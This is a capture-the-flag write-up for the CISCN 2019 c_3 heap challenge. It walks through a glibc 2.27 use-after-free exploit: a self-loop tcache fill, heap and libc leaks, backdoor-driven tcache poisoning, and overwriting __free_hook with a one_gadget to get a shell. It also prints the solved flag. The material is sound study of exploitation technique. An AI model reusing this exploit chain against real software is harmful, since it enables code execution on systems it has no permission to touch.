# CISCN 2019 — c_3: 9-slot UAF + selfloop tcache fill + backdoor accumulator

> Platform: BUUCTF (buuoj.cn) — glibc 2.27 (Ubuntu 18.04)
> Mitigations: Partial RELRO / Canary / NX / PIE (all on)
> Flag: `flag{0f322417-b662-4e13-a866-37f43fb0751f}`

## TL;DR

A heap UAF challenge constrained by a hidden cap of **9 lifetime allocations** (delete doesn't NULL pointers, so freed slots stay "taken"). Standard `fill-tcache → unsorted-bin leak` would consume all 9 slots, leaving none for tcache poisoning. The trick: **free the same chunk 7 times to fill tcache via self-loops**, freeing a single slot 8 times to land it in the unsorted bin. Pair with the **backdoor** menu (which increments `attack_count`) as a programmable accumulator to massage a tcache fd to any heap offset.

## Reverse summary

```
1: create  (sizes ∈ {0x60, 0x100, 0x4f})
2: show    (snprintf prints chunk[0]=attack_count, chunk[8]=attack_times, chunk[0x10..]=name)
3: delete  (free without zeroing weapon_list[idx])         ← UAF
5: exit
666: backdoor  (weapon[idx]->attack_count += idx-1 per call) ← accumulator
```

`create` enforces `weapon[idx][0] = 0` after each malloc — this kills any `system("/bin/sh")` plan because `dele(idx) → __free_hook(weapon[idx], …)` will pass a string that starts with `\0`.

## Exploit chain

### 1) Heap leak via selfloop tcache

```python
alloc(0x100, b'a\n') × 4   # idx 0,1,3,4
alloc(0x60,  b'a\n')       # idx 2 (used later)
for _ in range(7): dele(3) # tcache[0x110]: chunk3 → chunk3 → ... (selfloop, count=7)
show(3) → leak = chunk3[0] = chunk3.fd = chunk3 self-pointer
heap_base = leak - 0x4f0
```

In glibc 2.27, tcache has no double-free key check, so repeatedly freeing the same chunk just builds a self-referencing chain.

### 2) libc leak via 8th free → unsorted bin

```python
dele(3)   # 8th: tcache full → falls through to unsorted bin
show(3) → leak = chunk3.fd = main_arena pointer
libc_base = leak - 0x70 - sym['__malloc_hook']
```

`idx 4` (allocated earlier) acts as guard against consolidation into the top chunk.

### 3) tcache poison via `backdoor` accumulator

```python
dele(2); dele(2)            # tcache[0x70]: chunk2 selfloop (no key check in 2.27)
for _ in range(0x60):
    bonus(2)                # chunk2.fd += 1 each iteration → chunk2.fd = chunk2 + 0x60
```

`chunk2 + 0x60` equals the next chunk's start (chunk3_start), because chunk2's malloc-size is 0x70.

### 4) Walk the poisoned chain to `__free_hook`

```python
alloc(0x60, b'a\n')                              # pop chunk2; head ← chunk2+0x60
alloc(0x60, p64(free_hook - 0x10) + b'a\n')      # pop chunk2+0x60 (=chunk3_start)
                                                 #   user_ptr+0x10 lands at chunk3.fd
alloc(0x100, b'/bin/sh\n')                       # tcache[0x110] pop chunk3
                                                 #   head ← chunk3.fd = free_hook-0x10
alloc(0x100, p64(one_gadget) + b'\n')            # pop free_hook-0x10
                                                 #   user_ptr+0x10 = free_hook = one_gadget
```

### 5) Trigger

```python
dele(0)   # free(weapon[0]) → __free_hook = one_gadget
```

## Why `one_gadget`, not `system`

`__free_hook(weapon[idx], caller)` receives `weapon[idx]` as its first arg, but `create` always writes `weapon[idx][0] = 0`. So `system(weapon[idx])` is always `system("")`. strace confirms: `execve("/bin/sh", ["sh", "-c", ""], …)`. One-gadget takes no args and bypasses this.

Of the three BUU libc-2.27 one-gadgets at `0x4f2c5 / 0x4f322 / 0x10a38c`, only **`0x4f322`** satisfies its constraint (`[rsp+0x40] == NULL || valid argv`) inside the free stack frame.

## Lessons

- **Read every `create()` carefully** — initializer side effects (here, zeroing the first qword) silently void naive `system+/bin/sh` plans.
- **dele-doesn't-clear ≠ "you can free again randomly"**. Treat it as a programmable double-free primitive; selfloop fills are basically free.
- **2.27 tcache pop has no size validation**. Poisoned chunks can be any size class.
- **VMware NAT** can break BUUCTF DNS — monkey-patch `socket.getaddrinfo` or use `/etc/hosts`.

## References

- Public exp: [Yeuoly/buuctf_pwn — ciscn_2019_c_3](https://github.com/Yeuoly/buuctf_pwn/tree/master/ciscn_2019_c_3)
